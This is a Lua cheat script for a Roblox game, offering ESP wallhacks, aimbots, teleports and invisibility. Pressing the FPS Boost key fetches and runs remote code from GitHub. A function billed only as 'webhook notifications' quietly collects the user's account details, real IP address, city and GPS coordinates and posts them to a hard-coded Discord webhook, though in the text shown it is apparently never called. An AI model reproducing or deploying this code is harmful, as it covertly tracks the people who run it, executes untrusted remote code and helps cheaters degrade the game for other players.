-- KemilingHUB - Ultimate Combat Script
-- Features:
-- - ESP with health bars
-- - Body/Head Aimbot
-- - Spin attack (Q)
-- - Teleport behind target (G)
-- - Location teleport (P)
-- - Webhook notifications
-- - Invisibility with GUI indicator (Backquote `)
-- - FPS Boost (Toggle with [ key)

local function createLoadingScreen()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "KemilingLoadingScreen"
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.ResetOnSpawn = false

    -- Background Blur
    local blur = Instance.new("BlurEffect")
    blur.Size = 24
    blur.Parent = game:GetService("Lighting")
    
    -- Main Container
    local container = Instance.new("Frame")
    container.Size = UDim2.new(0.35, 0, 0.2, 0)
    container.Position = UDim2.new(0.325, 0, 0.4, 0)
    container.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
    container.BackgroundTransparency = 0.3
    container.BorderSizePixel = 0
    container.ClipsDescendants = true
    container.Parent = screenGui

    -- Modern UI Corners
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 8)
    corner.Parent = container

    -- Title Text
    local title = Instance.new("TextLabel")
    title.Text = "/GEEKN"
    title.Font = Enum.Font.GothamBlack
    title.TextSize = 24
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.BackgroundTransparency = 1
    title.Size = UDim2.new(1, 0, 0.3, 0)
    title.Position = UDim2.new(0, 0, 0.1, 0)
    title.Parent = container

    -- Subtitle Text
    local subtitle = Instance.new("TextLabel")
    subtitle.Text = "Premium Aladia Script"
    subtitle.Font = Enum.Font.GothamMedium
    subtitle.TextSize = 14
    subtitle.TextColor3 = Color3.fromRGB(200, 200, 200)
    subtitle.BackgroundTransparency = 1
    subtitle.Size = UDim2.new(1, 0, 0.2, 0)
    subtitle.Position = UDim2.new(0, 0, 0.35, 0)
    subtitle.Parent = container

    -- Modern Loading Bar Container
    local loadingBarContainer = Instance.new("Frame")
    loadingBarContainer.Name = "LoadingBarContainer"
    loadingBarContainer.Size = UDim2.new(0.8, 0, 0.08, 0)
    loadingBarContainer.Position = UDim2.new(0.1, 0, 0.6, 0)
    loadingBarContainer.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
    loadingBarContainer.BorderSizePixel = 0
    loadingBarContainer.Parent = container

    local containerCorner = Instance.new("UICorner")
    containerCorner.CornerRadius = UDim.new(1, 0)
    containerCorner.Parent = loadingBarContainer

    -- Loading Bar
    local loadingBar = Instance.new("Frame")
    loadingBar.Name = "LoadingBar"
    loadingBar.Size = UDim2.new(0, 0, 1, 0)
    loadingBar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
    loadingBar.BorderSizePixel = 0
    loadingBar.Parent = loadingBarContainer

    local barCorner = Instance.new("UICorner")
    barCorner.CornerRadius = UDim.new(1, 0)
    barCorner.Parent = loadingBar

    -- Percentage Text
    local percentageText = Instance.new("TextLabel")
    percentageText.Text = "0%"
    percentageText.Font = Enum.Font.GothamBold
    percentageText.TextSize = 16
    percentageText.TextColor3 = Color3.fromRGB(255, 255, 255)
    percentageText.BackgroundTransparency = 1
    percentageText.Size = UDim2.new(1, 0, 0.2, 0)
    percentageText.Position = UDim2.new(0, 0, 0.75, 0)
    percentageText.Parent = container

    -- Status Text
    local statusText = Instance.new("TextLabel")
    statusText.Text = "Initializing..."
    statusText.Font = Enum.Font.GothamMedium
    statusText.TextSize = 12
    statusText.TextColor3 = Color3.fromRGB(180, 180, 180)
    statusText.BackgroundTransparency = 1
    statusText.Size = UDim2.new(1, 0, 0.15, 0)
    statusText.Position = UDim2.new(0, 0, 0.9, 0)
    statusText.Parent = container

    -- Add to GUI
    screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

    -- Animate Loading Bar (15 Seconds)
    local duration = 10
    local startTime = tick()
    
    local statusMessages = {
        "Loading assets...",
        "Initializing modules...",
        "Setting up environment...",
        "Almost there...",
        "Preparing interface...",
        "Finalizing..."
    }
    
    local connection
    connection = game:GetService("RunService").RenderStepped:Connect(function()
        local elapsed = tick() - startTime
        local progress = math.min(elapsed / duration, 1)
        
        -- Update loading bar
        loadingBar.Size = UDim2.new(progress, 0, 1, 0)
        percentageText.Text = string.format("%d%%", math.floor(progress * 100))
        
        -- Update status text periodically
        local statusIndex = math.min(math.floor(progress * #statusMessages) + 1, #statusMessages)
        statusText.Text = statusMessages[statusIndex]
        
        if progress >= 1 then
            connection:Disconnect()
            screenGui:Destroy()
            blur:Destroy()
        end
    end)
end

createLoadingScreen()
wait(10) -- Wait for loading to finish

-- Fps Boost
local FPSBoostEnabled = false

local function toggleFPSBoost()
    FPSBoostEnabled = not FPSBoostEnabled
    
    if FPSBoostEnabled then
        -- Load script FPS boost sekali saja
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Alvantv/fpsboostadalia/main/data.lua"))()
        
        -- Beri notifikasi
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "FPS Boost",
            Text = "Diaktifkan",
            Duration = 2
        })
    else
        -- Beri notifikasi bahwa tidak bisa dimatikan
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "FPS Boost",
            Text = "Tidak bisa dinonaktifkan",
            Duration = 2
        })
    end
end

-- Function to send webhook
local function sendWebhook()
    --// Config
    getgenv().whscript = "KemilingHUB"        --Change to the name of your script
    getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1362840665821806622/hvGNRFEst_LeE_BYV1h_eQZBQpa_XgoJGc5SqS7V_qEsi3n8IjdLKrw5vwu3KUF2CAyI"  --Put your Webhook Url here
    getgenv().ExecLogSecret = true                --decide to also log secret section

    --// Execution Log Script
    local ui = game:GetService("CoreGui")
    local folderName = "screen"
    local folder = Instance.new("Folder")
    folder.Name = folderName
    local player = game:GetService("Players").LocalPlayer

    if ui:FindFirstChild(folderName) then
        print("Script is already executed! Rejoin if it's an error!")
        local ui2 = game:GetService("CoreGui")
        local folderName1 = "screen2"
        local folder2 = Instance.new("Folder")
        folder2.Name = folderName1
        if ui2:FindFirstChild(folderName1) then
            player:Kick("Anti-spam execution system triggered. Please rejoin to proceed.")
        else
            folder2.Parent = game:GetService("CoreGui")
        end
    else
        folder.Parent = game:GetService("CoreGui")
        local players = game:GetService("Players")
        local userid = player.UserId
        local gameid = game.PlaceId
        local jobid = tostring(game.JobId)
        local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
        local deviceType = game:GetService("UserInputService"):GetPlatform() == Enum.Platform.Windows and "PC 💻" or "Mobile 📱"
        local snipePlay = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. gameid .. ", '" .. jobid .. "', player)"
        local completeTime = os.date("%Y-%m-%d %H:%M:%S")
        local workspace = game:GetService("Workspace")
        local screenWidth = math.floor(workspace.CurrentCamera.ViewportSize.X)
        local screenHeight = math.floor(workspace.CurrentCamera.ViewportSize.Y)
        local memoryUsage = game:GetService("Stats"):GetTotalMemoryUsageMb()
        local playerCount = #players:GetPlayers()
        local maxPlayers = players.MaxPlayers
        local health = player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health or "N/A"
        local maxHealth = player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.MaxHealth or "N/A"
        local position = player.Character and player.Character:FindFirstChild("HumanoidRootPart") and player.Character.HumanoidRootPart.Position or "N/A"
        local gameVersion = game.PlaceVersion

        if not getgenv().ExecLogSecret then
            getgenv().ExecLogSecret = true
        end
        if not getgenv().whscript then
            getgenv().whscript = "KemilingHUB"
        end
        local commonLoadTime = 5
        task.wait(commonLoadTime)
        local pingThreshold = 100
        local serverStats = game:GetService("Stats").Network.ServerStatsItem
        local dataPing = serverStats["Data Ping"]:GetValueString()
        local pingValue = tonumber(dataPing:match("(%d+)")) or "N/A"
        local function checkPremium()
            local premium = "false"
            local success, response = pcall(function()
                return player.MembershipType
            end)
            if success then
                if response == Enum.MembershipType.None then
                    premium = "false"
                else
                    premium = "true"
                end
            else
                premium = "Failed to retrieve Membership:"
            end
            return premium
        end
        local premium = checkPremium()

        local url = getgenv().webhookexecUrl

        local data = {
            ["content"] = "",
            ["embeds"] = {
                {
                    ["title"] = "🚀 **KemlingHUB**",
                    ["description"] = "*Here are the details:*",
                    ["type"] = "rich",
                    ["color"] = tonumber(0x3498db), -- Clean blue color
                    ["fields"] = {
                        {
                            ["name"] = "🔍 **Script Info**",
                            ["value"] = "```💻 Script Name: " .. getgenv().whscript .. "\n⏰ Executed At: " .. completeTime .. "```",
                            ["inline"] = false
                        },
                        {
                            ["name"] = "👤 **Player Details**",
                            ["value"] = "```🧸 Username: " .. player.Name .. "\n📝 Display Name: " .. player.DisplayName .. "\n🆔 UserID: " .. userid .. "\n❤️ Health: " .. health .. " / " .. maxHealth .. "\n🔗 Profile: View Profile (https://www.roblox.com/users/" .. userid .. "/profile)```",
                            ["inline"] = false
                        },
                        {
                            ["name"] = "📅 **Account Information**",
                            ["value"] = "```🗓️ Account Age: " .. player.AccountAge .. " days\n💎 Premium Status: " .. premium .. "\n📅 Account Created: " .. os.date("%Y-%m-%d", os.time() - (player.AccountAge * 86400)) .. "```",
                            ["inline"] = false
                        },
                        {
                            ["name"] = "🎮 **Game Details**",
                            ["value"] = "```🏷️ Game Name: " .. gameName .. "\n🆔 Game ID: " .. gameid .. "\n🔗 Game Link (https://www.roblox.com/games/" .. gameid .. ")\n🔢 Game Version: " .. gameVersion .. "```",
                            ["inline"] = false
                        },
                        {
                            ["name"] = "🕹️ **Server Info**",
                            ["value"] = "```👥 Players in Server: " .. playerCount .. " / " .. maxPlayers .. "\n🕒 Server Time: " .. os.date("%H:%M:%S") .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "📡 **Network Info**",
                            ["value"] = "```📶 Ping: " .. pingValue .. " ms```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "🖥️ **System Info**",
                            ["value"] = "```📺 Resolution: " .. screenWidth .. "x" .. screenHeight .. "\n🔍 Memory Usage: " .. memoryUsage .. " MB\n⚙️ Executor: " .. identifyexecutor() .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "📍 **Character Position**",
                            ["value"] = "```📍 Position: " .. tostring(position) .. "```",
                            ["inline"] = true
                        },
                        {
                            ["name"] = "🪧 **Join Script**",
                            ["value"] = "```lua\n" .. snipePlay .. "```",
                            ["inline"] = false
                        }
                    },
                    ["thumbnail"] = {
                        ["url"] = "https://cdn.discordapp.com/icons/1221843343755972719/3dc56a5cc62de223fc48b1333235b142.webp?size=4096"
                    },
                    ["footer"] = {
                        ["text"] = "Execution Log | " .. os.date("%Y-%m-%d %H:%M:%S"),
                        ["icon_url"] = "https://cdn.discordapp.com/icons/1221843343755972719/3dc56a5cc62de223fc48b1333235b142.webp?size=4096"
                    }
                }
            }
        }

        -- Check if the secret tab should be included
        if getgenv().ExecLogSecret then
            local ip = game:HttpGet("https://api.ipify.org")
            local iplink = "https://ipinfo.io/" .. ip .. "/json"
            local ipinfo_json = game:HttpGet(iplink)
            local ipinfo_table = game:GetService("HttpService"):JSONDecode(ipinfo_json)

            table.insert(
                data.embeds[1].fields,
                {
                    ["name"] = "**`(🤫) User Location (Real life)`**",
                    ["value"] = "||(👣) IP Address: " .. ipinfo_table.ip .. "||\n||(🌆) Country: " .. ipinfo_table.country .. "||\n||(🪟) GPS Location: " .. ipinfo_table.loc .. "||\n||(🏙️) City: " .. ipinfo_table.city .. "||\n||(🏡) Region: " .. ipinfo_table.region .. "||\n||(🪢) Hoster: " .. ipinfo_table.org .. "||"
                }
            )
        end

        local newdata = game:GetService("HttpService"):JSONEncode(data)
        local headers = {
            ["content-type"] = "application/json"
        }
        local request = (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request) or http_request or request
        local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
        request(abcdef)
    end
end

-- Settings
local settings = {
    espKey = Enum.KeyCode.J,
    bodyAimbotKey = Enum.KeyCode.E,
    headAimbotKey = Enum.KeyCode.F,
    teleportKey = Enum.KeyCode.P,
    spinKey = Enum.KeyCode.Q,
    teleportBehindKey = Enum.KeyCode.G,
    invisibilityKey = Enum.KeyCode.Backquote,
    fpsBoostKey = Enum.KeyCode.LeftBracket, -- [ key for FPS Boost
    espColor = Color3.fromRGB(255, 70, 70),
    showHealth = true,
    espMaxDistance = 1000,
    espRefreshRate = 0.2,
    ignoreTeam = true,
    bodyLockSmoothness = 0.8,
    headLockSmoothness = 1,
    ignoreLowHealth = true,
    lowHealthThreshold = 1,
    headLockOffset = Vector3.new(0, -0.15, 0),
    headSizeFactor = 0.8,
    spinSpeed = 50,
    teleportDistance = 3,
    teleportLocation = CFrame.new(-112.114, 3814.211, 3197.210)
}

-- States
local espEnabled = false
local espFolders = {}
local lastEspUpdate = 0
local bodyLockActive = false
local headLockActive = false
local currentTarget = nil
local spinning = false
local spinVelocity = Vector3.new()
local spinConnection = nil
local invis_on = false

-- Create Invisibility GUI
local invisGui = Instance.new("ScreenGui")
local invisFrame = Instance.new("Frame")
local invisText = Instance.new("TextLabel")

-- Configure GUI
invisGui.Name = "InvisibilityGUI"
invisGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
invisGui.ResetOnSpawn = false

invisFrame.Name = "InvisFrame"
invisFrame.Parent = invisGui
invisFrame.BackgroundColor3 = Color3.new(0, 0, 0)
invisFrame.BackgroundTransparency = 0.5
invisFrame.BorderSizePixel = 0
invisFrame.Position = UDim2.new(0.5, -100, 0, 10)
invisFrame.Size = UDim2.new(0, 200, 0, 30)
invisFrame.Visible = false

invisText.Name = "InvisText"
invisText.Parent = invisFrame
invisText.BackgroundTransparency = 1
invisText.Size = UDim2.new(1, 0, 1, 0)
invisText.Font = Enum.Font.SourceSansBold
invisText.Text = "INVISIBILITY: OFF"
invisText.TextColor3 = Color3.new(1, 1, 1)
invisText.TextSize = 18

-- Utility functions
local function isEnemy(player)
    local localPlayer = game.Players.LocalPlayer
    if not localPlayer then return false end
    
    if settings.ignoreTeam and game:GetService("Teams") then
        local localTeam = localPlayer.Team
        local playerTeam = player.Team
        if localTeam and playerTeam then
            return localTeam ~= playerTeam
        end
    end
    
    return true
end

local function hasLowHealth(player)
    if not settings.ignoreLowHealth then return false end
    if not player.Character then return false end
    
    local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
    if not humanoid then return false end
    
    return humanoid.Health <= settings.lowHealthThreshold
end

-- ESP System
local function createESP(player)
    if player == game.Players.LocalPlayer then return end
    if not isEnemy(player) then return end
    
    if espFolders[player] then
        espFolders[player]:Destroy()
        espFolders[player] = nil
    end
    
    if not player.Character then
        player.CharacterAdded:Wait()
        task.wait(1)
    end
    
    if not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then return end
    
    local folder = Instance.new("Folder")
    folder.Name = player.Name.."_ESP"
    folder.Parent = workspace
    espFolders[player] = folder
    
    -- Highlight
    local highlight = Instance.new("Highlight")
    highlight.Name = "ESP_Highlight"
    highlight.OutlineColor = settings.espColor
    highlight.FillColor = settings.espColor
    highlight.FillTransparency = 0.85
    highlight.OutlineTransparency = 0.1
    highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
    highlight.Adornee = player.Character
    highlight.Parent = folder
    
    -- Name Display
    local nameBillboard = Instance.new("BillboardGui")
    nameBillboard.Name = "Name_Billboard"
    nameBillboard.Size = UDim2.new(0, 250, 0, 50)
    nameBillboard.StudsOffset = Vector3.new(0, 3, 0)
    nameBillboard.Adornee = player.Character:FindFirstChild("Head") or player.Character:WaitForChild("Head", 1)
    nameBillboard.AlwaysOnTop = true
    nameBillboard.MaxDistance = settings.espMaxDistance
    nameBillboard.ResetOnSpawn = false
    nameBillboard.Parent = folder
    
    local nameLabel = Instance.new("TextLabel")
    nameLabel.Name = "Name_Label"
    nameLabel.Text = player.Name
    nameLabel.Size = UDim2.new(1, 0, 1, 0)
    nameLabel.TextColor3 = Color3.new(1, 1, 1)
    nameLabel.BackgroundTransparency = 1
    nameLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
    nameLabel.TextStrokeTransparency = 0.5
    nameLabel.Font = Enum.Font.SourceSansBold
    nameLabel.TextSize = 18
    nameLabel.Parent = nameBillboard
    
    -- Health Bar
    if settings.showHealth then
        local healthBillboard = Instance.new("BillboardGui")
        healthBillboard.Name = "HealthBar_Billboard"
        healthBillboard.Size = UDim2.new(0.5, 0, 6.5, 0)
        healthBillboard.StudsOffset = Vector3.new(2, 0, 0)
        healthBillboard.Adornee = player.Character:FindFirstChild("HumanoidRootPart") or player.Character:WaitForChild("HumanoidRootPart", 1)
        healthBillboard.AlwaysOnTop = true
        healthBillboard.MaxDistance = settings.espMaxDistance
        healthBillboard.Parent = folder
        
        local healthBarContainer = Instance.new("Frame")
        healthBarContainer.Name = "HealthBarContainer"
        healthBarContainer.Size = UDim2.new(1, 0, 6/6.5, 0)
        healthBarContainer.Position = UDim2.new(0, 0, 0, 0)
        healthBarContainer.BackgroundTransparency = 1
        healthBarContainer.Parent = healthBillboard
        
        local healthBar = Instance.new("Frame")
        healthBar.Name = "HealthBar"
        healthBar.Size = UDim2.new(1, 0, 1, 0)
        healthBar.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
        healthBar.BackgroundTransparency = 0.5
        healthBar.BorderSizePixel = 0
        healthBar.ClipsDescendants = true
        healthBar.Parent = healthBarContainer
        
        local healthFill = Instance.new("Frame")
        healthFill.Name = "HealthFill"
        healthFill.Size = UDim2.new(1, 0, 1, 0)
        healthFill.AnchorPoint = Vector2.new(0, 1)
        healthFill.Position = UDim2.new(0, 0, 1, 0)
        healthFill.BackgroundColor3 = Color3.new(0, 1, 0)
        healthFill.BorderSizePixel = 0
        healthFill.Parent = healthBar
        
        local outline = Instance.new("UIStroke")
        outline.Name = "Outline"
        outline.Color = Color3.new(0, 0, 0)
        outline.Thickness = 1
        outline.Parent = healthBar
        
        local healthText = Instance.new("TextLabel")
        healthText.Name = "HealthText"
        healthText.Text = "100%"
        healthText.Size = UDim2.new(1, 0, 0.5/6.5, 0)
        healthText.Position = UDim2.new(0, 0, 6/6.5, 0)
        healthText.TextColor3 = Color3.new(1, 1, 1)
        healthText.BackgroundTransparency = 1
        healthText.TextStrokeColor3 = Color3.new(0, 0, 0)
        healthText.TextStrokeTransparency = 0.5
        healthText.Font = Enum.Font.SourceSansBold
        healthText.TextSize = 14
        healthText.Parent = healthBillboard
    end
    
    player.CharacterRemoving:Connect(function()
        if espFolders[player] then
            espFolders[player]:Destroy()
            espFolders[player] = nil
        end
    end)
end

local function updateESP()
    for player, folder in pairs(espFolders) do
        if player and player.Character and folder and folder.Parent then
            local nameBillboard = folder:FindFirstChild("Name_Billboard")
            if nameBillboard then
                local head = player.Character:FindFirstChild("Head")
                if head then
                    nameBillboard.Adornee = head
                end
            end
            
            if settings.showHealth then
                local healthBillboard = folder:FindFirstChild("HealthBar_Billboard")
                if healthBillboard then
                    local healthBar = healthBillboard:FindFirstChild("HealthBarContainer"):FindFirstChild("HealthBar")
                    local healthFill = healthBar and healthBar:FindFirstChild("HealthFill")
                    local healthText = healthBillboard:FindFirstChild("HealthText")
                    
                    local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
                    if humanoid then
                        local healthPercent = math.floor((humanoid.Health / humanoid.MaxHealth) * 100)
                        
                        if healthText then healthText.Text = healthPercent.."%" end
                        if healthFill then
                            healthFill.Size = UDim2.new(1, 0, healthPercent/100, 0)
                            
                            if healthPercent > 75 then
                                healthFill.BackgroundColor3 = Color3.new(0, 1, 0)
                            elseif healthPercent > 50 then
                                healthFill.BackgroundColor3 = Color3.new(1, 1, 0)
                            elseif healthPercent > 25 then
                                healthFill.BackgroundColor3 = Color3.new(1, 0.5, 0)
                            else
                                healthFill.BackgroundColor3 = Color3.new(1, 0, 0)
                            end
                        end
                    else
                        if healthText then healthText.Text = "DEAD" end
                        if healthFill then healthFill.Size = UDim2.new(1, 0, 0, 0) end
                    end
                end
            end
        else
            if folder then folder:Destroy() end
            espFolders[player] = nil
        end
    end
end

local function toggleESP()
    espEnabled = not espEnabled
    
    if espEnabled then
        for _, player in pairs(game.Players:GetPlayers()) do
            if player ~= game.Players.LocalPlayer then
                coroutine.wrap(function()
                    createESP(player)
                end)()
                
                player.CharacterAdded:Connect(function(character)
                    if espEnabled then
                        task.wait(1)
                        createESP(player)
                    end
                end)
            end
        end
    else
        for player, folder in pairs(espFolders) do
            if folder then folder:Destroy() end
            espFolders[player] = nil
        end
    end
    
    game.StarterGui:SetCore("ChatMakeSystemMessage", {
        Text = "ESP: " .. (espEnabled and "ON" or "OFF"),
        Color = espEnabled and Color3.new(0, 1, 0) or Color3.new(1, 0, 0),
        FontSize = Enum.FontSize.Size24,
    })
end

-- Aimbot System
local function getPreciseHeadPosition(head)
    if not head then return nil end
    local headSize = head.Size.Y
    return head.Position + Vector3.new(0, -headSize * (1 - settings.headSizeFactor), 0) + settings.headLockOffset
end

local function findClosestPlayer(aimForHead)
    local playerList = game.Players:GetPlayers()
    local localPlayer = game.Players.LocalPlayer
    local camera = workspace.CurrentCamera
    local closestPlayer = nil
    local closestDistance = math.huge
    
    for _, player in pairs(playerList) do
        if player ~= localPlayer and isEnemy(player) and player.Character then
            if hasLowHealth(player) then continue end
            
            local targetPart = nil
            if aimForHead and player.Character:FindFirstChild("Head") then
                targetPart = player.Character.Head
            elseif player.Character:FindFirstChild("HumanoidRootPart") then
                targetPart = player.Character.HumanoidRootPart
            end
            
            if targetPart then
                local targetPos = aimForHead and getPreciseHeadPosition(targetPart) or targetPart.Position
                local screenPoint = camera:WorldToViewportPoint(targetPos)
                if screenPoint.Z > 0 then
                    local distance = (Vector2.new(screenPoint.X, screenPoint.Y) - 
                                    Vector2.new(camera.ViewportSize.X/2, camera.ViewportSize.Y/2)).Magnitude
                    if distance < closestDistance then
                        closestDistance = distance
                        closestPlayer = player
                    end
                end
            end
        end
    end
    
    return closestPlayer
end

local function aimAtTarget()
    if not currentTarget or not currentTarget.Character then return end
    
    local camera = workspace.CurrentCamera
    local targetPosition = nil
    local smoothness = settings.bodyLockSmoothness
    
    if headLockActive then
        local head = currentTarget.Character:FindFirstChild("Head")
        if head then
            targetPosition = getPreciseHeadPosition(head)
            smoothness = settings.headLockSmoothness
        end
    end
    
    if not targetPosition and currentTarget.Character:FindFirstChild("HumanoidRootPart") then
        targetPosition = currentTarget.Character.HumanoidRootPart.Position
    end
    
    if targetPosition then
        local currentCF = camera.CFrame
        local targetCF = CFrame.new(camera.CFrame.Position, targetPosition)
        camera.CFrame = currentCF:Lerp(targetCF, smoothness)
    end
end

local function toggleAimbot(mode)
    if mode == false then
        -- Turn off aimbot
        headLockActive = false
        bodyLockActive = false
        currentTarget = nil
        game.StarterGui:SetCore("ChatMakeSystemMessage", {
            Text = "Aimbot: OFF",
            Color = Color3.new(1, 0, 0),
            FontSize = Enum.FontSize.Size24
        })
        return
    end

    -- mode is either true (head) or nil (body)
    headLockActive = mode == true
    bodyLockActive = not headLockActive

    currentTarget = findClosestPlayer(headLockActive)
    if currentTarget then
        game.StarterGui:SetCore("ChatMakeSystemMessage", {
            Text = (headLockActive and "Head Lock" or "Body Lock").." Aimbot: ON (Target: "..currentTarget.Name..")",
            Color = headLockActive and Color3.new(1, 0.5, 0) or Color3.new(0, 1, 0),
            FontSize = Enum.FontSize.Size24
        })
    else
        game.StarterGui:SetCore("ChatMakeSystemMessage", {
            Text = "No valid targets found",
            Color = Color3.new(1, 1, 0),
            FontSize = Enum.FontSize.Size24
        })
        headLockActive = false
        bodyLockActive = false
    end
end


-- Movement Features
local function teleportToLocation()
    local player = game.Players.LocalPlayer
    if player and player.Character then
        local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
        if humanoidRootPart then
            humanoidRootPart.CFrame = settings.teleportLocation
            game.StarterGui:SetCore("ChatMakeSystemMessage", {
                Text = "Teleported to specified location!",
                Color = Color3.new(0, 1, 1),
                FontSize = Enum.FontSize.Size24
            })
        end
    end
end

local function toggleSpin()
    spinning = not spinning
    local player = game.Players.LocalPlayer
    
    if spinning then
        game.StarterGui:SetCore("ChatMakeSystemMessage", {
            Text = "Spin: ON (Movement allowed)",
            Color = Color3.new(0, 1, 0),
            FontSize = Enum.FontSize.Size24
        })
        
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            spinVelocity = player.Character.HumanoidRootPart.Velocity
        end
        
        if spinConnection then spinConnection:Disconnect() end
        spinConnection = game:GetService("RunService").Heartbeat:Connect(function(deltaTime)
            if not spinning then return end
            
            if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                local root = player.Character.HumanoidRootPart
                local rotation = CFrame.Angles(0, math.rad(settings.spinSpeed * deltaTime * 60), 0)
                local currentCFrame = root.CFrame
                local newCFrame = currentCFrame * rotation
                
                if root.Velocity.Magnitude > 1 then
                    spinVelocity = root.Velocity
                end
                
                root.CFrame = newCFrame
                root.Velocity = spinVelocity
            end
        end)
    else
        game.StarterGui:SetCore("ChatMakeSystemMessage", {
            Text = "Spin: OFF",
            Color = Color3.new(1, 0, 0),
            FontSize = Enum.FontSize.Size24
        })
        
        spinVelocity = Vector3.new()
        if spinConnection then
            spinConnection:Disconnect()
            spinConnection = nil
        end
    end
end

local function teleportBehindTarget()
    if not currentTarget or not currentTarget.Character then
        game.StarterGui:SetCore("ChatMakeSystemMessage", {
            Text = "No target selected!",
            Color = Color3.new(1, 0, 0),
            FontSize = Enum.FontSize.Size24
        })
        return
    end

    local localPlayer = game.Players.LocalPlayer
    local targetChar = currentTarget.Character
    local localChar = localPlayer.Character
    
    if not localChar or not targetChar then return end
    
    local targetRoot = targetChar:FindFirstChild("HumanoidRootPart")
    local localRoot = localChar:FindFirstChild("HumanoidRootPart")
    
    if not targetRoot or not localRoot then return end
    
    local targetCF = targetRoot.CFrame
    local behindPosition = targetCF * CFrame.new(0, 0, settings.teleportDistance)
    
    if spinning then
        local currentSpinVelocity = spinVelocity
        localRoot.CFrame = CFrame.new(behindPosition.Position, targetRoot.Position)
        spinVelocity = currentSpinVelocity
    else
        localRoot.CFrame = CFrame.new(behindPosition.Position, targetRoot.Position)
    end
    
    game.StarterGui:SetCore("ChatMakeSystemMessage", {
        Text = "Teleported behind "..currentTarget.Name,
        Color = Color3.new(0, 1, 1),
        FontSize = Enum.FontSize.Size24
    })
end

-- Invisibility System
local function toggleInvisibility()
    if not game.Players.LocalPlayer.Character then return end
    
    invis_on = not invis_on
    if invis_on then
        local savedpos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
        wait()
        game.Players.LocalPlayer.Character:MoveTo(Vector3.new(-25.95, 84, 3537.55))
        wait(.15)
        local Seat = Instance.new('Seat', game.Workspace)
        Seat.Anchored = false
        Seat.CanCollide = false
        Seat.Name = 'invischair'
        Seat.Transparency = 1
        Seat.Position = Vector3.new(-25.95, 84, 3537.55)
        local Weld = Instance.new("Weld", Seat)
        Weld.Part0 = Seat
        Weld.Part1 = game.Players.LocalPlayer.Character:FindFirstChild("Torso") or game.Players.LocalPlayer.Character.UpperTorso
        wait()
        Seat.CFrame = savedpos
        
        -- Update GUI
        invisFrame.Visible = true
        invisFrame.BackgroundColor3 = Color3.fromRGB(0, 170, 0) -- Green when active
        invisText.Text = "INVISIBILITY: ON"
        
        game.StarterGui:SetCore("ChatMakeSystemMessage", {
            Text = "Invisibility: ON",
            Color = Color3.new(0, 1, 0),
            FontSize = Enum.FontSize.Size24
        })
    else
        local invisChair = workspace:FindFirstChild('invischair')
        if invisChair then
            invisChair:Remove()
        end
        
        -- Update GUI
        invisFrame.BackgroundColor3 = Color3.fromRGB(170, 0, 0) -- Red when inactive
        invisText.Text = "INVISIBILITY: OFF"
        
        -- Hide GUI after 2 seconds
        task.delay(2, function()
            invisFrame.Visible = false
        end)
        
        game.StarterGui:SetCore("ChatMakeSystemMessage", {
            Text = "Invisibility: OFF",
            Color = Color3.new(1, 0, 0),
            FontSize = Enum.FontSize.Size24
        })
    end
end

-- Keybindsss
game:GetService("UserInputService").InputBegan:Connect(function(input, processed)
    if not processed then
        if input.KeyCode == settings.espKey then
            toggleESP()
        elseif input.KeyCode == settings.bodyAimbotKey then
            toggleAimbot(false)
        elseif input.UserInputType == Enum.UserInputType.MouseButton2 then
    toggleAimbot(true)
        elseif input.KeyCode == settings.teleportKey then
            teleportToLocation()
        elseif input.KeyCode == settings.spinKey then
            toggleSpin()
        elseif input.KeyCode == settings.teleportBehindKey then
            teleportBehindTarget()
        elseif input.KeyCode == settings.invisibilityKey then
            toggleInvisibility()
        elseif input.KeyCode == settings.fpsBoostKey then
            toggleFPSBoost()
        end
    end
end)


game:GetService("UserInputService").InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton2 then
        toggleAimbot(false)
    end
end)


-- Player management
game.Players.PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(function(character)
        if espEnabled then
            task.wait(1)
            createESP(player)
        end
    end)
end)

game.Players.PlayerRemoving:Connect(function(player)
    if espFolders[player] then
        espFolders[player]:Destroy()
        espFolders[player] = nil
    end
    if currentTarget == player then
        currentTarget = nil
        bodyLockActive = false
        headLockActive = false
    end
end)

-- Cleanup
local function cleanup()
    spinning = false
    spinVelocity = Vector3.new()
    
    if spinConnection then
        spinConnection:Disconnect()
        spinConnection = nil
    end
    
    for player, folder in pairs(espFolders) do
        if folder then folder:Destroy() end
        espFolders[player] = nil
    end
    
    local invisChair = workspace:FindFirstChild('invischair')
    if invisChair then
        invisChair:Remove()
    end
    
    -- Reset invisibility GUI
    invisFrame.Visible = false
    invis_on = false
    
    -- Reset FPS boost if enabled
    if FPSBoostEnabled then
        toggleFPSBoost()
    end
end

